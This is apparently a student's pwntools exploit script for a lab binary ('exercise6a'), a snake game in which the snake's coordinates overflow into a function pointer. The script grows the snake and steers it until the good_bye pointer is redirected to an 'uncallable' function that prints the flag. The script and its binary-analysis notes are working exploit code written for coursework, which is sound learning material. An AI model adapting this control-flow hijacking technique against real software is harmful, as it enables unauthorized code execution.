#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise6/exercise6a'
exe = './exercise6a'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x0
binsz    15399
bintype  elf
bits     64
canary   true
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      true
relocs   true
relro    full
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
'''
0x00001289 31 sym.good_bye
0x000012a8 23 sym.uncallable
0x000012bf 988 sym.update_board
0x0000169b 133 sym.draw_board
0x00001720 481 sym.init_board
0x00001901 750 main
0x00001901 750 sym.main
'''
'''
0x00002008 10 str.Good_bye
0x00002012 9 str.cat_flag
0x0000201f 15 str.good_bye____p
0x0000202e 15 str.uncallable__p
0x0000203d 16 str.fruit:___u__u
0x0000204d 8 str.snake:
0x00002055 10 str.u__u
0x0000205f 18 str.snake_length:__d
0x00002071 6 str.Win
0x00002078 66 str.a_left__s_down__w_up__d_right__A_auto__q_quit__followed_by_enter:
'''
    
AIMBOT = b'A'
LEFT = b'a'
RIGHT = b'd'
UP = b'w'
DOWN = b's'
QUIT = b'q'

good_bye_address = r.recvline()[:-1]
good_bye_address = good_bye_address[good_bye_address.index(b'0x'):]
uncallable_address = r.recvline()[:-1]
uncallable_address = uncallable_address[uncallable_address.index(b'0x'):]

r.recvuntil(b'fruit: ')
fruit = r.recvuntil(b'\n')[:-1]
r.recvuntil(b'snake: ')
snake = r.recvuntil(b'\n')[:-1]

print(snake)
print(good_bye_address) #0x5589f69b3289
print(uncallable_address) #0x5589f69b32a8

r.recvuntil(b'snake length: ')
snake_length = int(r.recvuntil(b'\n')[:-1].decode())

menu = r.recvuntil(b'followed by enter:\n')
print(menu.decode())

#66 bytes from where snake parts coordinates are stored until the first byte of good byte pointer address -> when snakes has length >= 33, then it overwrites the function pointers with snake part coordinates

while snake_length != 33:
    r.sendline(AIMBOT)
    good_bye_address = r.recvline()[:-1]
    good_bye_address = good_bye_address[good_bye_address.index(b'0x'):]
    uncallable_address = r.recvline()[:-1]
    uncallable_address = uncallable_address[uncallable_address.index(b'0x'):]

    r.recvuntil(b'fruit: ')
    fruit = r.recvuntil(b'\n')[:-1]
    r.recvuntil(b'snake: ')
    snake = r.recvuntil(b'\n')[:-1]
    #print(snake)

    r.recvuntil(b'snake length: ')
    snake_length = int(r.recvuntil(b'\n')[:-1].decode())
    print(str(snake_length) + " ", end="")

    r.recvuntil(b'followed by enter:\n')

#odd behaviour: if you go right/left and cross the boundary, you don't end up on the same line, the x coordinates keep increasing/decreasing

print()
#observe: lowest byte address of goodbye gets changed when snake has length 33
#from assembly, it's the last non (0, 0) part of the snake, more precicly the y coordinate of the last snake part that 
#that determines the lowest byte of the good bye address pointer -> modify it with "w" until it matches
#does not seem to work with w; use other directions, knowing that left/right cause the snake to go up/down anyway

r.sendline(DOWN)
good_bye_address_modify = r.recvline()[:-1]
good_bye_address_modify = good_bye_address_modify[good_bye_address_modify.index(b'0x'):]
uncallable_address_modify = r.recvline()[:-1]
uncallable_address_modify = uncallable_address_modify[uncallable_address_modify.index(b'0x'):]
print("good_bye_address_modify  : ", end="")
print(good_bye_address_modify)
print("uncallable_address_modify: ", end="")
print(uncallable_address_modify)
print(20 * "*")
#uncallable_address = r.recvline()[:-1]
#uncallable_address = uncallable_address[uncallable_address.index(b'0x'):]
#
#r.recvuntil(b'fruit: ')
#fruit = r.recvuntil(b'\n')[:-1]
#r.recvuntil(b'snake: ')
#snake = r.recvuntil(b'\n')[:-1]
#print(snake)
#
#r.recvuntil(b'snake length: ')
#snake_length = int(r.recvuntil(b'\n')[:-1].decode())
menu = r.recvuntil(b'followed by enter:\n')
#print(menu.decode())
while good_bye_address_modify != uncallable_address:
    r.sendline(RIGHT) #try all directions.
    good_bye_address_modify = r.recvline()[:-1]
    good_bye_address_modify = good_bye_address_modify[good_bye_address_modify.index(b'0x'):]
    uncallable_address_modify = r.recvline()[:-1]
    uncallable_address_modify = uncallable_address_modify[uncallable_address_modify.index(b'0x'):]
    print("good_bye_address_modify  : ", end="")
    print(good_bye_address_modify)
    print("uncallable_address_modify: ", end="")
    print(uncallable_address_modify)
    menu = r.recvuntil(b'followed by enter:\n')
    print(menu.decode())


#r.sendline(b'w')
#menu = r.recvuntil(b'followed by enter:\n')
#print(menu.decode())
r.sendline(QUIT)
print(r.recvall(timeout=5))

    

#for i in range(100):
#    print(r.recvline())
#    print(r.recvline())
#    print(r.recvuntil(b'followed by enter:\n').decode())
#    r.sendline(b'A')
#    print(r.recvall())


#r.sendline(b'\x1b') #good bye
#r.sendline(b'\x71') #good bye
#r.sendline(b'\xff') #terminates program after printing out game
#r.sendline(b'A') #aims auto. at fruit
#r.sendline(b'\x0a') #terminates program
#print(r.recvall(timeout=5))    
